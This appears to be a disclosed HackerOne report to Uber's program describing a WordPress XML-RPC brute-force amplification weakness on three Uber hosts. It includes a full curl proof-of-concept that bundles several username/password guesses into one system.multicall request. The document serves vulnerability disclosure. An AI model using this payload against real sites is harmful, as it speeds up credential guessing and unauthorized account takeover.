---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '125624'
original_report_id: '125624'
title: Brute Force Amplification Attack
weakness: Violation of Secure Design Principles
team_handle: uber
created_at: '2016-03-24T06:35:04.959Z'
disclosed_at: '2016-08-12T17:23:50.190Z'
has_bounty: false
visibility: full
substate: informative
vote_count: 1
tags:
- hackerone
- violation-of-secure-design-principles
---

# Brute Force Amplification Attack

## Metadata

- HackerOne Report ID: 125624
- Weakness: Violation of Secure Design Principles
- Program: uber
- Disclosed At: 2016-08-12T17:23:50.190Z
- Has Bounty: No
- Visibility: full
- Substate: informative

## Original Report

The websites on following hosts

- newsroom.uber.com
- eng.uber.com
- brand.uber.com

are vulnerable to Wordpress Brute Force Amplification Attack where an attacker can try a large number of Wordpress usernames and password login combinations in single HTTP request (more at https://blog.cloudflare.com/a-look-at-the-new-wordpress-brute-force-amplification-attack/). The attack can be used with large wordlists, because it makes brute forcing login very fast.


Steps to reproduce:

1) execute following curl command:

curl -i -s -k  -X 'POST' \
    -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0' -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-binary $'<?xml version=\"1.0\"?>\x0d\x0a<methodCall>\x0d\x0a<methodName>system.multicall</methodName>\x0d\x0a<params>\x0d\x0a  <param><value><array><data>\x0d\x0a  <value><struct>\x0d\x0a  <member>\x0d\x0a    <name>methodName</name>\x0d\x0a    <value><string>wp.getUsersBlogs</string></value>\x0d\x0a  </member>\x0d\x0a  <member>\x0d\x0a    <name>params</name><value><array><data>\x0d\x0a    <value><array><data>\x0d\x0a    <value><string>admin</string></value>\x0d\x0a    <value><string>1223</string></value>\x0d\x0a    </data></array></value>\x0d\x0a    </data></array></value>\x0d\x0a  </member>\x0d\x0a  </struct></value>\x0d\x0a  <value><struct>\x0d\x0a  <member>\x0d\x0a    <name>methodName</name>\x0d\x0a    <value><string>wp.getUsersBlogs</string></value>\x0d\x0a  </member>\x0d\x0a  <member>\x0d\x0a    <name>params</name>\x0d\x0a    <value><array><data>\x0d\x0a    <value><array><data>\x0d\x0a      <value><string>admin</string></value>\x0d\x0a      <value><string>test</string></value>\x0d\x0a      </data></array></value>\x0d\x0a    </data></array></value>\x0d\x0a  </member>\x0d\x0a  </struct></value>\x0d\x0a  <value><struct>\x0d\x0a  <member>\x0d\x0a    <name>methodName</name>\x0d\x0a    <value><string>wp.getUsersBlogs</string></value>\x0d\x0a  </member>\x0d\x0a  <member>\x0d\x0a    <name>params</name>\x0d\x0a    <value><array><data>\x0d\x0a    <value><array><data>\x0d\x0a      <value><string>admin</string></value>\x0d\x0a      <value><string>uber</string></value>\x0d\x0a      </data></array></value>\x0d\x0a    </data></array></value>\x0d\x0a  </member>\x0d\x0a  </struct></value>\x0d\x0a  </data></array></value>\x0d\x0a  </param>\x0d\x0a</params>\x0d\x0a</methodCall>' \
    'https://newsroom.uber.com/xmlrpc.php'

2) In the above request 3 usernames and passwords combinations are submitted to https://newsroom.uber.com/xmlrpc.php.

3) From the response it is evident that all 3 combinations have been checked on the server.

Attached to this report are screenshots of this issue in Burp proxy. A request and a response to newsroom.uber.com is visible. In the response it is evident that 2 combinations of username and password have been checked on newsroom.uber.com.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
